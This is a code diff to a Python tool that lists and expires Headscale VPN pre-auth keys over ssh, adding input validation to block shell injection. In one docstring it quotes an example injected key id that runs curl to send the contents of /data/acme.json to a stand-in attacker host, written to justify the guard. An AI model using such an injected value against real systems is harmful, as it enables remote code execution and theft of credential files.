@@ -74,6 +74,10 @@ _ROW = re.compile(
 )
 
 
+# Docker container names: what the daemon itself accepts, no wider.
+_SAFE_CONTAINER = re.compile(r"[A-Za-z0-9][A-Za-z0-9_.-]*")
+
+
 def _strip_ansi(text: str) -> str:
     return re.sub(r"\x1b\[[0-9;]*m", "", text)
 
@@ -125,6 +129,149 @@ def headscale_apikeys(ssh_target: str, container: str = "headscale") -> list[Key
             "so an empty list means the query failed, not that none are needed."
         )
     return keys
+
+
+@dataclass(frozen=True)
+class PreAuthKey:
+    """A tailnet admission ticket, which is a different thing from an API key.
+
+    An API key administers Headscale. A pre-auth key does exactly one thing:
+    register a machine into the mesh. In this fleet the mesh IS the perimeter --
+    staging is VPN-only and there is no second gate behind it -- so a `reusable`
+    key that has not expired is a standing invitation for as long as it lives.
+    """
+
+    key_id: str
+    prefix: str
+    reusable: bool
+    used: bool
+    expires_at: datetime
+    owner: str
+
+    @property
+    def is_live(self) -> bool:
+        return self.expires_at > datetime.now(timezone.utc)
+
+    @property
+    def risk(self) -> str:
+        """Why this one matters, in the operator's terms rather than a boolean."""
+        if not self.is_live:
+            return "expired"
+        if self.reusable and not self.used:
+            return "REUSABLE, unused — admits any number of machines until it expires"
+        if self.reusable:
+            return "reusable — still admits more machines"
+        return "single-use"
+
+
+# `headscale preauthkeys list` is a wider table than the apikeys one and the
+# column order differs, so it gets its own pattern rather than a shared, laxer
+# one that would silently match the wrong field.
+_PREAUTH_ROW = re.compile(
+    r"^\s*(?P<id>\d+)\s*\|\s*(?P<prefix>\S+)\s*\|\s*(?P<reusable>true|false)"
+    r"\s*\|\s*(?P<ephemeral>true|false)\s*\|\s*(?P<used>true|false)"
+    r"\s*\|\s*(?P<expires>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})"
+    r"\s*\|\s*(?P<created>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})"
+    r"\s*\|\s*(?P<owner>\S+)"
+)
+
+
+def parse_headscale_preauthkeys(output: str) -> list[PreAuthKey]:
+    """Rows from `headscale preauthkeys list`, ANSI stripped."""
+    keys: list[PreAuthKey] = []
+    for line in _strip_ansi(output).splitlines():
+        m = _PREAUTH_ROW.match(line)
+        if not m:
+            continue
+        keys.append(
+            PreAuthKey(
+                key_id=m.group("id"),
+                prefix=m.group("prefix"),
+                reusable=m.group("reusable") == "true",
+                used=m.group("used") == "true",
+                expires_at=datetime.strptime(m.group("expires"), "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc),
+                owner=m.group("owner"),
+            )
+        )
+    return keys
+
+
+def headscale_preauthkeys(ssh_target: str, container: str = "headscale") -> list[PreAuthKey]:
+    """Ask the VPS which machines it would still admit.
+
+    Unlike `headscale_apikeys`, an empty list here is a legitimate answer: a fleet
+    can genuinely hold no pre-auth keys, and the GCP hub's design goal is exactly
+    that -- it mints a single-use key at boot instead of storing one. So this
+    raises only when the host could not be asked, never on emptiness.
+
+    `check-expiry` does not cover these. That gap is why three reusable keys sat
+    live and unnoticed until 2026-08-23: absence from a report nobody wrote is
+    not evidence of absence.
+    """
+    result = subprocess.run(
+        [
+            "ssh",
+            "-o",
+            "ConnectTimeout=10",
+            "-o",
+            "BatchMode=yes",
+            ssh_target,
+            f"docker exec {container} headscale preauthkeys list",
+        ],
+        capture_output=True,
+        text=True,
+    )
+    if result.returncode != 0:
+        raise ExpiryUnavailableError(f"could not ask headscale on {ssh_target}: {result.stderr.strip()}")
+    return parse_headscale_preauthkeys(result.stdout)
+
+
+def expire_headscale_preauthkey(ssh_target: str, key_id: str, container: str = "headscale") -> None:
+    """Expire one pre-auth key by id. Raises if the command did not succeed.
+
+    Never expires by prefix: headscale truncates prefixes in its own output
+    (`hskey-auth-xxxx-***`), so a prefix is a display string and matching on one
+    risks acting on the wrong key -- or on none, silently.
+
+    `--force` is required, not defensive. Without it headscale prompts for
+    confirmation, and under `BatchMode=yes` there is no terminal to answer, so the
+    command would hang or abort depending on the ssh buffer -- a failure that
+    looks like a network problem and is not. Flags verified against the running
+    v0.28 binary rather than assumed: it is `--id`, not `--identifier`.
+
+    Both arguments are validated at this boundary rather than at the caller.
+    Raised in review of #1353: the CLI path is safe because it matches `key_id`
+    against ids it parsed from headscale's own output, but this function is
+    importable and the argument is interpolated into a string that a remote shell
+    executes. A caller passing `"20; curl attacker/?k=$(cat /data/acme.json)"`
+    would get arbitrary execution on the VPS. `headscale_apikeys` shares the
+    pattern, but this one MUTATES, so the blast radius is larger and the guard
+    belongs where the string is built, not where today's only caller happens to
+    be careful.
+
+    A `raise`, not an `assert`: assertions vanish under `python -O`, and a guard
+    that an interpreter flag can switch off is not a guard.
+    """
+    if not key_id.isdigit():
+        raise ValueError(f"pre-auth key id must be numeric, got {key_id!r}")
+    if not _SAFE_CONTAINER.fullmatch(container):
+        raise ValueError(f"unsafe container name {container!r}")
+
+    result = subprocess.run(
+        [
+            "ssh",
+            "-o",
+            "ConnectTimeout=10",
+            "-o",
+            "BatchMode=yes",
+            ssh_target,
+            f"docker exec {container} headscale preauthkeys expire --force --id {key_id}",
+        ],
+        capture_output=True,
+        text=True,
+    )
+    if result.returncode != 0:
+        raise ExpiryUnavailableError(f"could not expire pre-auth key {key_id}: {result.stderr.strip()}")
 
 
 def resolve_expiry(spec: object) -> Expiry:
